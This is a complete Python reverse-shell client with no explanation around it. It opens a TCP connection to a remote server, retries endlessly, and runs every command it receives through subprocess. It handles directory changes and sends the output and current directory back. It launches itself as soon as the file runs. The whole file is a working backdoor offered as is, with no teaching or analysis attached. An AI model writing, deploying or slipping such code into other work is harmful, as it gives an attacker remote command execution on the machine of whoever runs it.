import os
import socket
import subprocess
BUFFLEN = 4096

class Client:

	def __init__(self,server='localhost',port=2000):
		self.server = server
		self.port = port

		self.socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		while True: # 5 retries for connection
			try:
				self.socket.connect((self.server,self.port))
				cwd = os.getcwd().encode()
				self.socket.sendall(cwd)
				self.interact()
				break;
			except socket.error:
				print("Unable to connect to remote server. retrying ...")



	def interact(self):
		try:
			while True:
				command = self.socket.recv(BUFFLEN).decode()

				if command.lower() == 'exit':
					break
				stdout = ''
				if command.split(' ')[0].lower() == 'cd':
					try:
						directory = ''.join(command.split(' ')[1:])
						os.chdir(directory)
					except Exception as e:
						stdout = e
				else:
					stdout = subprocess.getoutput(command)

				cwd = os.getcwd()

				response = f'{stdout}<-->{cwd}'.encode()

				self.socket.sendall(response)
		except Exception as e:
			print(e)

	def __del__(self):
		self.socket.close()


Client()